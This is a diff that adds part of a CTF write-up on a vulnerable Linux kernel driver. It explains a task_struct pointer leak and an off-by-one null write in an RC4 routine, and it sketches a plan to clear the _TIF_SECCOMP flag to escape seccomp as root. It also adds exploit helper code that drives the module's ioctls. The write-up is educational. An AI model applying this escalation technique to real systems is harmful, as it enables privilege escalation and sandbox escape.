@@ -232,3 +232,89 @@ The value of each parameter is defined at the top of the file
 #define KEBAB_IOCTL_READ      0xBEBE
 #define KEBAB_IOCTL_SET_KEY   0x1CAFE
 ```
+
+### Spotting the vulnerability
+
+There is a big leak in `KEBAB_IOCTL_SET_KEY`, they provide us with ``current`` pointer. At the moment, we execute `/chall/run` as root because of SUID perms, but we cannot open the flag because of SECCOMP rules. There is a flag called `_TIF_SECCOMP`, that is on if SECCOMP is enabled, if we could zero out this flag somehow we could disable SECCOMP and read the flag or even spawn a shell. This flag is stored at `current->thread_info.flags`, which happens to be the first 8 bytes of the `task_struct`. So having now our leak, if we zero out the address we are given, we will break out of the restricted environment.
+
+The global `RC4_key` variable is defined at the top of the file along with the other structures: `static char RC4_key[MAX_RC4_LEN + 1] = {0};` it is sized `MAX_RC4_LEN + 1`!
+The encrypting function that does the heavy lifting is `rc4_crypt`:
+
+```c
+void rc4_crypt(struct rc4_state *const state, const unsigned char *inbuf, unsigned char *outbuf, int buflen)
+{
+	int i;
+	unsigned char j;
+
+	for (i = 0; i <= buflen; i++) { /* !!!! */
+
+		state->index1++;
+		state->index2 += state->perm[state->index1];
+
+		swap_bytes(&state->perm[state->index1],
+		    &state->perm[state->index2]);
+
+		j = state->perm[state->index1] + state->perm[state->index2];
+		outbuf[i] = inbuf[i] ^ state->perm[j];
+	}
+}
+```
+
+The function is looping for 1 more iteration that it should, for a 16 byte buffer, it is starting at index 0 and the last iteration will be at index 16! **Off-by-one vuln**
+In this case it is actually an **off-by-null**, because for a 16 byte buffer it is taking one more byte, that in the case of this module always happens to be 0.
+
+Now we will debug the module to see how is this affecting to the kernel heap. But first we create some helper functions to interact with the driver.
+
+> **NOTE:** I copied every needed structure and every macro from the module, including parameters, sizes, etc.
+
+```c
+
+static char key_buf[MAX_RC4_LEN] = {0};
+static char leak_buf[MAX_RC4_LEN] = {0};
+static key_info leak = {0};
+
+static void logleak(char *__s, unsigned long addr){
+	printf("[*] %s : %#lx\n", __s, addr);
+}
+
+static void create_buf(int size, char *buf){
+
+	struct new_secbuff_arg arg = {
+		.size = size,
+		.buffer = buf
+	};
+
+	memcpy(arg.key, key_buf, MAX_RC4_LEN);
+
+	ioctl(fd, KEBAB_IOCTL_NEW, &arg);
+}
+
+static void read_buf(unsigned long index, char *buf){
+	struct read_secbuff_arg arg = {
+		.index = index,
+		.buffer = buf
+	};
+
+	memcpy(arg.key, key_buf, MAX_RC4_LEN);
+}
+
+static void set_key(void){
+	memcpy(leak_buf, key_buf, MAX_RC4_LEN);
+	
+	if(ioctl(fd, KEBAB_IOCTL_SET_KEY, leak_buf) < 0 ){
+		printf("[-] Error setting the key\n");
+	}
+
+	memcpy(&leak, leak_buf, sizeof(key_info));
+}
+
+```
+
+First we will retrieve our important leak and save it in a global variable `current`;
+
+```c
+set_key();
+unsigned long current = (unsigned long)leak.cur;
+logleak("task_struct current", current);
+logleak("PID", (unsigned long)leak.pid);
+```
